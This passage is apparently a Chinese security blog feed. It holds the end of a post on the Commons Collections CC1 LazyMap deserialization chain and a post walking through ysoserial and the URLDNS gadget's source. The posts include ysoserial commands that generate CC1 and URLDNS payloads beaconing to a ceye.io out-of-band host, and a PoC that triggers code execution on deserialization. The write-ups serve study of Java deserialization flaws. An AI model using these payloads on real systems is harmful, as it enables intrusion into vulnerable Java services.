class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./CC1.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(file);</span><br><span class="line">            input.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Method m = Runtime.class.getMethod(&quot;getRuntime&quot;);</span></span><br><span class="line"><span class="comment"> Runtime r = (Runtime)m.invoke(null); //这里的getRuntime是static的方法，所以可以不写实例化对象。</span></span><br><span class="line"><span class="comment"> r.exec(&quot;需要的路径&quot;);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的POC主要还是参考的P神的Java安全漫谈。</p><p>当运行了这个POC之后就会直接弹出计算器。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230507155137201.png" alt="image-20230507155137201"></p><p>这里我们再仔细的看一下具体的函数调用特点:</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230507154832202.png" alt="image-20230507154832202"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230507154853296.png" alt="image-20230507154853296"></p><p>在这个LazyMap中的get方法里，调用的<code>factory.transform(key)</code>实际上就是调用的<code>Tranformer</code>这个类中的transform()方法，同时可以知道factory是可控的。</p><p>就像是TransformedMap链中一样，当我们调用decorate()函数的时候，就会创建一个新的Map类，因此我们会直接将其中的factory类设置为ChainedTransformer类，随后就能直接调用其中的transform()方法，然后完成对链的调用。</p><p>这条链子的区别和之前的TransformedMap的区别就只有前面这部分，不包含后面部分。</p><h3 id="关于ysoserial中的ConstantTransformer-1"><a href="#关于ysoserial中的ConstantTransformer-1" class="headerlink" title="关于ysoserial中的ConstantTransformer(1):"></a>关于ysoserial中的ConstantTransformer(1):</h3><p>根据P神的Java安全漫谈中的说法，应该是为了隐藏启动进程的日志特征。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230507163010779.png" alt="image-20230507163010779"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URLDNS与ysoserial简单使用</title>
      <link href="/2023/09/21/URLDNS%E4%B8%8Eysoserial%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
      <url>/2023/09/21/URLDNS%E4%B8%8Eysoserial%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="CC链1："><a href="#CC链1：" class="headerlink" title="CC链1："></a>CC链1：</h1><h2 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h2><p>CC链，也就是<code>Apache Commons Collections</code>中的反序列化POP链。</p><p><code>Apache Commons</code>是<code>Apache</code>开源的Java通用类项目在Java中项目中被广泛的使用，<code>Apache Commons</code>当中有一个组件叫做<code>Apache Commons Collections</code>，主要封装了Java的<code>Collection（集合）</code>相关类对象。</p><h2 id="ysoserial："><a href="#ysoserial：" class="headerlink" title="ysoserial："></a>ysoserial：</h2><p><code>ysoserial</code>是一个继承了Java反序列化各种利用链的工具。大部分时候是用来生成利用链的。</p><blockquote><p><a href="https://github.com/angelwhu/ysoserial[">项目链接</a></p></blockquote><p>这里简单讲一下<code>ysoserial</code>的安装配置问题。</p><p>首先，想要下载<code>ysoserial</code>有两种办法：</p><p>第一种是直接通过这个链接下载一个jar包。</p><blockquote><p><a href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</a></p></blockquote><p>然后将下载下来的jar包直接用java命令进行使用就可以了。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230305144247999.png" alt="image-20230305144247999"></p><p>这个谐音梗挺好玩的。</p><p>第二种方法就是直接去项目原来的地址下载源代码文件，然后通过maven打包，编译成jar包，然后重复之上过程。</p><p>这里需要注意的是，为了跟链子，我们是需要知道ysoserial中的代码是怎么运行的，但是在用Maven打包的时候，我遇到了一个<code>settings.xml</code>的问题。</p><p>报错：</p><p><code>&#39;settings.xml&#39; has syntax errors</code></p><p>我的Maven是3.8.6版本，在<code>settings.xml</code>的这里有一个多余的<code>&lt;mirror&gt;</code>标签。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230306203932551.png" alt="image-20230306203932551"></p><p>删除即可。</p><p>具体使用的命令也由两种：</p><p>一种是直接运行ysoserial.jar中的主类函数，另外一种是运行ysoserial中的exploit类，也就是生成exp。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar [payload] &#x27;[command]&#x27;</span><br><span class="line">java -jar ysoserial.jar URLDNS http://xx.xxxxx.ceye.io</span><br><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 &#x27;ping -c 2  rce.267hqw.ceye.io&#x27;</span><br></pre></td></tr></table></figure><p><a href="https://ccship.cn/2021/10/21/ysoserial%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/">这部分的参考文章</a></p><p>以及P神的Java安全漫谈。</p><h2 id="Ysoserial是如何生成Payload的："><a href="#Ysoserial是如何生成Payload的：" class="headerlink" title="Ysoserial是如何生成Payload的："></a>Ysoserial是如何生成Payload的：</h2><p>这里我以URLDNS为例，来理解一下这个工具生成Payload的逻辑和方法。</p><p>这里首先看一下源码里面是怎么生成的Payload。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ysoserial-master\src\main\java\ysoserial\payloads\URLDNS.java</span><br></pre></td></tr></table></figure><p>打开文件之后可以看见源码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"><span class="comment">//导入包</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A blog post with more details about this gadget chain is at the url below:</span></span><br><span class="line"><span class="comment"> *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   This was inspired by  Philippe Arteau <span class="doctag">@h</span>3xstream, who wrote a blog</span></span><br><span class="line"><span class="comment"> *   posting describing how he modified the Java Commons Collections gadget</span></span><br><span class="line"><span class="comment"> *   in ysoserial to open a URL. This takes the same idea, but eliminates</span></span><br><span class="line"><span class="comment"> *   the dependency on Commons Collections and does a DNS lookup with just</span></span><br><span class="line"><span class="comment"> *   standard JDK classes.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The Java URL class has an interesting property on its equals and</span></span><br><span class="line"><span class="comment"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span></span><br><span class="line"><span class="comment"> *   during a comparison (either equals or hashCode).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   As part of deserialization, HashMap calls hashCode on each key that it</span></span><br><span class="line"><span class="comment"> *   deserializes, so using a Java URL object as a serialized key allows</span></span><br><span class="line"><span class="comment"> *   it to trigger a DNS lookup.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   Gadget Chain:</span></span><br><span class="line"><span class="comment"> *     HashMap.readObject()</span></span><br><span class="line"><span class="comment"> *       HashMap.putVal()</span></span><br><span class="line"><span class="comment"> *         HashMap.hash()</span></span><br><span class="line"><span class="comment"> *           URL.hashCode()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class="line"><span class="meta">@Dependencies()</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里还是简单的进行一下代码审计，首先看一下主类。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230306235540713.png" alt="image-20230306235540713"></p><p>这里的主类很简单，就是执行了一个类的方法，也就是<code>PayloadRunner.run</code>。</p><p>然后将上面定义的<code>URLDNS</code>这个类传入作为参数，以及将直接传入主类的字符串数组args作为参数。</p><p>这里看一下<code>PayloadRunner.run</code>这个方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PayloadRunner</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">(<span class="keyword">final</span> Class&lt;? extends ObjectPayload&lt;?&gt;&gt; clazz, <span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">// ensure payload generation doesn&#x27;t throw an exception</span></span><br><span class="line"><span class="type">byte</span>[] serialized = <span class="keyword">new</span> <span class="title class_">ExecCheckingSecurityManager</span>().callWrapped(<span class="keyword">new</span> <span class="title class_">Callable</span>&lt;<span class="type">byte</span>[]&gt;()&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] call() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> args.length &gt; <span class="number">0</span> &amp;&amp; args[<span class="number">0</span>] != <span class="literal">null</span> ? args[<span class="number">0</span>] : getDefaultTestCmd();</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;generating payload object(s) for command: &#x27;&quot;</span> + command + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">ObjectPayload&lt;?&gt; payload = clazz.newInstance();</span><br><span class="line">                <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">objBefore</span> <span class="operator">=</span> payload.getObject(command);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;serializing payload&quot;</span>);</span><br><span class="line"><span class="type">byte</span>[] ser = Serializer.serialize(objBefore);</span><br><span class="line">Utils.releasePayload(payload, objBefore);</span><br><span class="line">                <span class="keyword">return</span> ser;</span><br><span class="line">&#125;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;deserializing payload&quot;</span>);</span><br><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">objAfter</span> <span class="operator">=</span> Deserializer.deserialize(serialized);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个类中没有主函数，当调用这个run方法的时候，要求传入的类参数，必须是Class的子类，同时这个子类必须继承<code>ObjectPayload</code>这个类。</p><p>然后定义了一个字节数组，这个数组用于存放后面的对象的方法，这里可以通过名字看出来应当是一个调用函数的方法。</p><p>稍微看一下<code>callWrapped</code>这个方法，这部分是ysoserial的作者添加的一个类。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">callWrapped</span><span class="params">(<span class="keyword">final</span> Callable&lt;T&gt; callable)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="type">SecurityManager</span> <span class="variable">sm</span> <span class="operator">=</span> System.getSecurityManager(); <span class="comment">// save sm</span></span><br><span class="line">System.setSecurityManager(<span class="built_in">this</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">T</span> <span class="variable">result</span> <span class="operator">=</span> callable.call();</span><br><span class="line"><span class="keyword">if</span> (throwException &amp;&amp; ! getCmds().isEmpty()) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExecException</span>(getCmds().get(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="keyword">if</span> (! (e <span class="keyword">instanceof</span> ExecException) &amp;&amp; throwException &amp;&amp; ! getCmds().isEmpty()) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExecException</span>(getCmds().get(<span class="number">0</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">throw</span> e;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">System.setSecurityManager(sm); <span class="comment">// restore sm</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里调用了一下java中自带的system类方法，也就是<code>System.getSecurityManager()</code>，用来确保调用安全。</p><p>然后通过<code>System.setSecurityManager()</code>添加自己这个类。然后用T这个泛型去占了个位，然后去存储<code>callable</code>的返回值，这里可能是想要写一个多线程。</p><p>然后如果try失败，或者是无法调用方法，则报错。</p><p>回头再继续看PayloadRunenr。</p><p>接下来，是定义了一个final修饰的字符串类型的变量，然后用一个三元运算符来进行判断。</p><p>如果我们传入的数组第一位部位null，同时内部有内容，则使用传入的args本身，否则就调用默认设置的方法。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230314145059515.png" alt="image-20230314145059515"></p><p>输出然后通过输出函数，写出写入有效载荷中的命令。</p><p>然后是通过反射的方式，对我们传入的类（这里也就是使用的URLDNS这个类）进行反射创建。</p><p>创建了类之后，调用类中的<code>getObject()</code>方法，也就是相当于是执行对应类中的代码了。</p><p>接下来是调用了一个<code>Serializer.serialize()</code>方法。这个方法是一个自定义的类，看一下：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230314163326288.png" alt="image-20230314163326288"></p><p>可以看到这里其实就是直接进行了一个序列化的操作，只是他序列化的步骤分成了两个<code>serialize()</code>函数。</p><p>最后是作为一个字节数组返回的，随后存在ser这个数组里。</p><p>然后调用<code>Utils.releasepayload()</code>，用于判断之前反射的类是不是<code>ReleaseableObjectPayload</code>这个类的子类或者是实例。</p><p>如果是，就将反射的类强制类型转换为<code>ReleaseObjectPayload</code>类，然后调用<code>release(object)</code>方法。</p><p>随后返回ser。</p><blockquote><p>这里稍微总结一下这个的调用顺序。也就是首先在<code>URLDNS.java</code>中，对<code>PayloadRunner.run()</code>进行调用，这是会跳转到<code>run()</code>方法，在方法中，会通过<code>callWrapped()</code>方法，进入方法后，会直接调用参数类中的<code>call()</code>方法。</p><p>因为在参数中，new了一个<code>Callable()</code>，并通过匿名内部类对这个<code>Callable</code>内中的方法进行了重写，因此上述调用其实就是直接对匿名内部类中重写的<code>call()</code>方法进行了调用。</p><p>当调用<code>call()</code>方法的时候，就会调用到之前<code>URLDNS.java</code>中的<code>getObject()</code>方法。</p><p>也就是通过反射来管理我们传入的类，这里传入的就是<code>URLDNS.class</code>，然后将反射了<code>URLDNS.class</code>的反射类添加Payload进行序列化。</p><p>这样就可以在不影响原本类的前提下，对类进行序列化操作和改变。</p><p>可以知道，ysoserial生成payload的方式都是通过这个PayloadRunner类来进行生成的，实际上改变的只有传入进去的类的数据而已。</p></blockquote><h2 id="URLDNS："><a href="#URLDNS：" class="headerlink" title="URLDNS："></a>URLDNS：</h2><p>看完了Payload生成的逻辑，这里来详细理解一下URLDNS这条反序列化链子：</p><p><code>URLDNS</code>是<code>ysoserial</code>里面一个最简单的一个利用链。</p><p>但是严格来说，这个不能成为一个利用链，这是因为参数不是一个可以利用的命令，而是一个简单的<strong>URL</strong>，触发的结果也不是命令执行，而是一次DNS请求。</p><p>但是这条利用链子中存在以下优点：</p><blockquote><p>1、使用Java内置的类构造，对第三方库没有以来</p><p>2、在目标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞。</p></blockquote><p>使用指令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar .\ysoserial.jar URLDNS &quot;http://xxx.ceye.io&quot; &gt; dnslog.ser</span><br></pre></td></tr></table></figure><p>可以生成URLDNS的Payload，并封装入一个ser文件中。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230305154520813.png" alt="image-20230305154520813"></p><p>这里我直接使用ceye这个网站，来进行DNS查询的反馈，因此，我生成如下反序列化文件：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230316004521791.png" alt="image-20230316004521791"></p><p>并且通过代码进行检测：</p><p>测试代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNSTest</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;dnslog.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ob</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(input);</span><br><span class="line">            ob.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当将文件放在文件夹下之后，运行我们准备好的测试程序，可以在ceye平台找到对应的DNS查询记录。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230316004916632.png" alt="image-20230316004916632"></p><p>这里就算是URLDNS已经打通了。</p><p>需要注意的是，要使用<code>ysoserial</code>生成payload，不能使用Windows系统下的Powershell，以及IDEA默认的终端，不然都会因为编码不同，导致文件无法被反序列化。会报以下的错误。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230317183541690.png" alt="image-20230317183541690"></p><p>可以在配置里面，更改IDEA的终端程序，然后可以正常运行。</p><p>接下来对Payload进行详细分析，并不通过ysoserial写出自己的POC。</p><p>首先还是看一下ysoserial是怎么生成URLDNS的Payload的。根据我们之前对于ysoserial生成payload的流程的分析，可以知道的是，实际上每一个不同的payload最关键的调用部分是对应的类的<code>getObject()</code>这个方法部分。因此，我们直接看下<code>URLDNS.java</code>的<code>getObject()</code>方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">               <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">               <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">               <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">               <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">               <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">               ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">               Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">               <span class="keyword">return</span> ht;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的Payload首先生成了一个<code>URLStreamHandler</code>的实例，然后生成了一个<code>HashMap</code>的实例<code>ht</code>，随后调用了<code>ht.put()</code>方法。最后返回的是<code>ht</code>。</p><p>就像我们之前在看生成Payload部分看到的一样，最后返回的<code>ht</code>就是用于序列化的类，因此，我们可以知道这里的利用点是<code>Hashmap</code>里面的<code>readObject()</code>方法。</p><p>这里直接跟进一下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read loadFactor (ignore threshold)</span></span><br><span class="line">        <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> fields.get(<span class="string">&quot;loadFactor&quot;</span>, <span class="number">0.75f</span>);</span><br><span class="line">        <span class="keyword">if</span> (lf &lt;= <span class="number">0</span> || Float.isNaN(lf))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> + lf);</span><br><span class="line"></span><br><span class="line">        lf = Math.min(Math.max(<span class="number">0.25f</span>, lf), <span class="number">4.0f</span>);</span><br><span class="line">        HashMap.UnsafeHolder.putLoadFactor(<span class="built_in">this</span>, lf);</span><br><span class="line"></span><br><span class="line">        reinitialize();</span><br><span class="line"></span><br><span class="line">        s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">        <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> + mappings);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// use defaults</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">double</span> <span class="variable">dc</span> <span class="operator">=</span> Math.ceil(mappings / (<span class="type">double</span>)lf);</span><br><span class="line">            <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((dc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                       DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                       (dc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                       MAXIMUM_CAPACITY :</span><br><span class="line">                       tableSizeFor((<span class="type">int</span>)dc));</span><br><span class="line">            <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                         (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">            <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">            SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">            <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">            table = tab;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span 